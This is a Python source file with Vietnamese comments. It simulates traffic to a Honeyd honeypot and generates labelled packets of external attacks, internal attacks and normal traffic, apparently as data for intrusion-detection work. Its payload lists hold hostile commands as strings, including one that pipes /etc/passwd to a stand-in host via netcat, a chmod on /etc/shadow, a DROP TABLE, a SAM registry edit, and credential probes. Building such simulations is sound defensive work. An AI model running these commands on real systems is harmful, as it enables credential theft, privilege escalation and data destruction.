# honeyd_simulator.py
import random
import time
from dataclasses import dataclass, field
from typing import List

@dataclass
class NetworkPacket:
    timestamp:    float
    src_ip:       str
    dst_ip:       str
    src_port:     int
    dst_port:     int
    protocol:     str      # TCP / UDP / ICMP
    flags:        str      # SYN, ACK, RST, FIN
    payload:      str
    ttl:          int
    packet_size:  int
    attack_class: str      # 'internal' / 'external' / 'normal'

class HoneydSimulator:
    """
    Mô phỏng Honeyd - honeypot mã nguồn mở
    Ảo hóa nhiều hệ điều hành và dịch vụ:
      - Web server (port 80, 443)
      - SSH (port 22)
      - FTP (port 21)
      - Telnet (port 23)
      - SMB (port 445)
    """
    SIMULATED_SERVICES = {
        80:  "HTTP",
        443: "HTTPS",
        22:  "SSH",
        21:  "FTP",
        23:  "Telnet",
        445: "SMB",
        3306:"MySQL",
        8080:"HTTP-Alt",
    }

    HONEYD_IP_RANGE = [
        "192.168.1.100",  # Windows XP (giả lập)
        "192.168.1.101",  # Linux Ubuntu (giả lập)
        "192.168.1.102",  # Windows Server (giả lập)
    ]

    def _make_external_attack(self) -> NetworkPacket:
        """Tấn công từ bên ngoài - IP public"""
        attack_payloads = [
            "GET /phpMyAdmin/setup.php HTTP/1.1",
            "GET /wp-admin/admin-ajax.php HTTP/1.1",
            "USER anonymous\r\nPASS guest@",
            "SSH-2.0-libssh2_1.8.0",
            "\x00\x50\x56 EXPLOIT_BUFFER_OVERFLOW",
            "GET /etc/passwd HTTP/1.0",
            "POST /login admin:admin",
        ]
        return NetworkPacket(
            timestamp    = time.time() + random.uniform(0, 3600),
            src_ip       = f"{random.randint(1,223)}."
                           f"{random.randint(0,255)}."
                           f"{random.randint(0,255)}."
                           f"{random.randint(1,254)}",
            dst_ip       = random.choice(self.HONEYD_IP_RANGE),
            src_port     = random.randint(1024, 65535),
            dst_port     = random.choice(list(self.SIMULATED_SERVICES.keys())),
            protocol     = "TCP",
            flags        = random.choice(["SYN", "SYN-ACK", "ACK"]),
            payload      = random.choice(attack_payloads),
            ttl          = random.randint(50, 128),
            packet_size  = random.randint(64, 1500),
            attack_class = "external",
        )

    def _make_internal_attack(self) -> NetworkPacket:
        """Tấn công nội bộ - leo thang đặc quyền"""
        internal_payloads = [
            "sudo su -",
            "net user administrator /active:yes",
            "chmod 777 /etc/shadow",
            "SELECT * FROM users WHERE 1=1",
            "DROP TABLE logs;",
            "cat /etc/passwd | nc attacker.com 4444",
            "reg add HKLM\\SAM /f",
        ]
        return NetworkPacket(
            timestamp    = time.time() + random.uniform(0, 3600),
            src_ip       = f"192.168.1.{random.randint(1, 50)}",
            dst_ip       = random.choice(self.HONEYD_IP_RANGE),
            src_port     = random.randint(1024, 65535),
            dst_port     = random.choice([22, 3306, 445, 80]),
            protocol     = random.choice(["TCP", "UDP"]),
            flags        = "ACK",
            payload      = random.choice(internal_payloads),
            ttl          = random.randint(120, 128),
            packet_size  = random.randint(128, 512),
            attack_class = "internal",
        )

    def _make_normal_traffic(self) -> NetworkPacket:
        """Lưu lượng bình thường"""
        normal_payloads = [
            "GET /index.html HTTP/1.1",
            "POST /api/login HTTP/1.1",
            "GET /favicon.ico HTTP/1.1",
            "HEAD / HTTP/1.0",
        ]
        return NetworkPacket(
            timestamp    = time.time() + random.uniform(0, 3600),
            src_ip       = f"192.168.0.{random.randint(1, 254)}",
            dst_ip       = random.choice(self.HONEYD_IP_RANGE),
            src_port     = random.randint(1024, 65535),
            dst_port     = random.choice([80, 443]),
            protocol     = "TCP",
            flags        = "ACK",
            payload      = random.choice(normal_payloads),
            ttl          = 64,
            packet_size  = random.randint(64, 256),
            attack_class = "normal",
        )

    def generate_traffic(self, n: int = 500) -> List[NetworkPacket]:
        packets = []
        for _ in range(n):
            r = random.random()
            if r < 0.40:
                packets.append(self._make_external_attack())
            elif r < 0.65:
                packets.append(self._make_internal_attack())
            else:
                packets.append(self._make_normal_traffic())
        packets.sort(key=lambda p: p.timestamp)
        print(f"[Honeyd] Generated {len(packets)} packets | "
              f"external={sum(1 for p in packets if p.attack_class=='external')} | "
              f"internal={sum(1 for p in packets if p.attack_class=='internal')} | "
              f"normal={sum(1 for p in packets if p.attack_class=='normal')}")
        return packets